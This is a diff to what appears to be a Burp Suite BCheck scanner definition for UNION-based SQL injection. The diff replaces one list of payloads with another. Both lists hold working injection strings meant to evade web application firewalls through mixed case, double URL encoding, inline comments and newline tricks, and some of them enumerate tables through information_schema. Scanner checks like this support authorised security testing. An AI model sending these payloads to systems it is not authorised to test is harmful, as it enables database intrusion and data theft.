@@ -5,17 +5,19 @@ metadata:
     author: "BCheck Arsenal"
     tags: "sqli", "union", "waf-bypass"
 
+run for each:
+    payload = "1' ORDER BY 10-- -",
+        "1' UNION SELECT NULL,NULL,NULL,NULL-- -",
+        "1%2527%2520UNION%2520SELECT%2520NULL,NULL,NULL--",
+        "-1' uNiOn SeLeCt 1,2,3 fRoM iNfOrMaTiOn_ScHeMa.tAbLeS-- -",
+        "-1' UNION%0ASELECT%0ANULL,NULL,NULL--",
+        "-1' uNiOn%20SeLeCt%20null,null,null--"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "1'/*!50000oRdEr*/+/*!50000bY*/+10-- -"
-            - "1'/*!50000uNiOn*/+/*!50000sElEcT*/+nUlL,nUlL,nUlL,nUlL-- -"
-            - "1%2527%2520UNION%2520SELECT%2520NULL,NULL,NULL--"
-            - "-1' uNiOn SeLeCt 1,gRoUp_cOnCaT(0x7e,tAbLe_nAmE,0x7e),3 fRoM iNfOrMaTiOn_ScHeMa.tAbLeS-- -"
-            - "-1'/**/UNION/**/SELECT/**/1,2,3,4,5-- -"
+        replacing: {payload}
 
-    if {check.response} matches "(NULL|root@|information_schema|mysql\.user|pg_catalog)" then
+    if {latest.response.body} matches "(NULL|root@|information_schema|mysql.user|pg_catalog)" then
         report issue:
             severity: high
             confidence: firm
